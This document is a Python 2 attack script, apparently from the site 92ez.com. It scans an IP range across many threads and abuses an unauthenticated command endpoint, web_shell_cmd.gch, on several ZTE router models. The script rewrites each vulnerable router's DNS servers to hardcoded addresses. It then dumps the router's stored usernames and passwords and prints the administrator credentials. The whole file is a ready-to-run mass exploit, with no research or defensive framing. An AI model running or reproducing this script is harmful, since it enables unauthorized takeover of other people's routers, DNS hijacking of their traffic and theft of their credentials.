#!/usr/bin/env python
# coding=utf-8
# code by 92ez.com
# create time 2015-12-22

import Queue
from threading import Thread
import requests
import time
import re
import sys

def GetCurrentTime():
    return time.strftime('%Y/%m/%d %H:%M:%S',time.localtime(time.time()))

#ip to num
def ip2num(ip):
    ip = [int(x) for x in ip.split('.')]
    return ip[0] << 24 | ip[1] << 16 | ip[2] << 8 | ip[3]

#num to ip
def num2ip(num):
    return '%s.%s.%s.%s' % ((num & 0xff000000) >> 24,(num & 0x00ff0000) >> 16,(num & 0x0000ff00) >> 8,num & 0x000000ff)

#
def ip_range(start, end):
    return [num2ip(num) for num in range(ip2num(start), ip2num(end) + 1) if num & 0xff]

#
def bThread(iplist):
    threadl = []
    queue = Queue.Queue()
    for host in iplist:
        queue.put(host)

    threadl = [tThread(queue) for x in xrange(0, int(SETTHREAD))]

    for t in threadl:
        t.start()
    for t in threadl:
        t.join()

#create thread
class tThread(Thread):

    def __init__(self, queue):
        Thread.__init__(self)
        self.queue = queue

    def run(self):
        while not self.queue.empty():
            host = self.queue.get()
            try:
                setDNS(host)
            except:
                continue

def setDNS(host):
    aimurl = "http://"+host+"/web_shell_cmd.gch"
    paramData = "IF_ACTION=apply&IF_ERRORSTR=SUCC&IF_ERRORPARAM=SUCC&IF_ERRORTYPE=-1&Cmd=sendcmd 1 DB set DHCPSHostCfg 0 DNSServers1"
    device = ['F412','F420','F427','F460','F660']

    try:
        response = requests.get(aimurl, timeout=5, verify=False,data=paramData)
        result = response.content

    except Exception, e:
        return

    if len(result)==0:
        return

    title = re.findall(r'<title>(.+?)</title>',result)

    if len(title) == 0:
        return

    if title[0] in device:
        try:
            getDNS1 = re.findall(r'<DM name=\"DNSServers1\" val=\"(.+?)\"\/>',result)
            getDNS2 = re.findall(r'<DM name=\"DNSServers2\" val=\"(.+?)\"\/>',result)
            getDNS3 = re.findall(r'<DM name=\"DNSServers3\" val=\"(.+?)\"\/>',result)

            setDNS1 = "IF_ACTION=apply&IF_ERRORSTR=SUCC&IF_ERRORPARAM=SUCC&IF_ERRORTYPE=-1&Cmd=sendcmd 1 DB set DHCPSHostCfg 0 DNSServers1 "+dns1
            setDNS2 = "IF_ACTION=apply&IF_ERRORSTR=SUCC&IF_ERRORPARAM=SUCC&IF_ERRORTYPE=-1&Cmd=sendcmd 1 DB set DHCPSHostCfg 0 DNSServers2 "+dns2
            setDNS3 = "IF_ACTION=apply&IF_ERRORSTR=SUCC&IF_ERRORPARAM=SUCC&IF_ERRORTYPE=-1&Cmd=sendcmd 1 DB set DHCPSHostCfg 0 DNSServers3 "+dns3

            try:
                setRep1 = requests.get(aimurl, timeout=5, verify=False,data=setDNS1)
                setRes1 = setRep1.content
                setRep2 = requests.get(aimurl, timeout=5, verify=False,data=setDNS2)
                setRes2 = setRep2.content
                setRep3 = requests.get(aimurl, timeout=5, verify=False,data=setDNS3)
                setRes3 = setRep3.content

                try:
                    infoParamData = "IF_ACTION=apply&IF_ERRORSTR=SUCC&IF_ERRORPARAM=SUCC&IF_ERRORTYPE=-1&Cmd=sendcmd 1 DB p UserInfo"
                    infoReq = requests.get(aimurl, timeout=5, verify=False,data=infoParamData)
                    infoRes = infoReq.content

                    userList = re.findall(r'<DM name=\"Username\" val=\"(.+?)\"\/>',infoRes)
                    pwdList = re.findall(r'<DM name=\"Password\" val=\"(.+?)\"\/>',infoRes)

                    superUser = userList[0]
                    superPwd = pwdList[0]

                    commonUser = userList[1]
                    commonPwd = pwdList[1]

                    print GetCurrentTime()+' http://'+host+' GET DNS1 = '+getDNS1[0]+' DNS2 = '+getDNS2[0]+' DNS3 = '+getDNS3[0]+' >>> SET DNS SUCCESS ! SUPER USER : '+ superUser +' PASSWORD : '+superPwd

                except Exception,e:
                    return

            except Exception,e:
                return

        except Exception,e:
            return

if __name__ == '__main__':
    print '\n----------------------------------------\n'
    print '   SET DNS FOR ZTE ROUTER BY PYTHON       '
    print '         http://www.92ez.com       '
    print '\n----------------------------------------\n'

    global dns1
    global dns2
    global dns3
    global SETTHREAD


    dns1 = '114.114.114.114'
    dns2 = '8.8.8.8'
    dns3 = '192.168.1.1'

    print '> DNS1 : '+dns1
    print '> DNS2 : '+dns2
    print '> DNS3 : '+dns3+'\n'

    try:
        startIp = raw_input('START IP: ')
        endIp = raw_input('END   IP: ')
        SETTHREAD = raw_input('THREAD: ')  

        iplist = ip_range(startIp, endIp)

        print '\n[NOTE] TOTAL '+str(len(iplist))+" IP , RUNNING...\n"
        bThread(iplist)

    except KeyboardInterrupt:
        print '\n'
        sys.exit()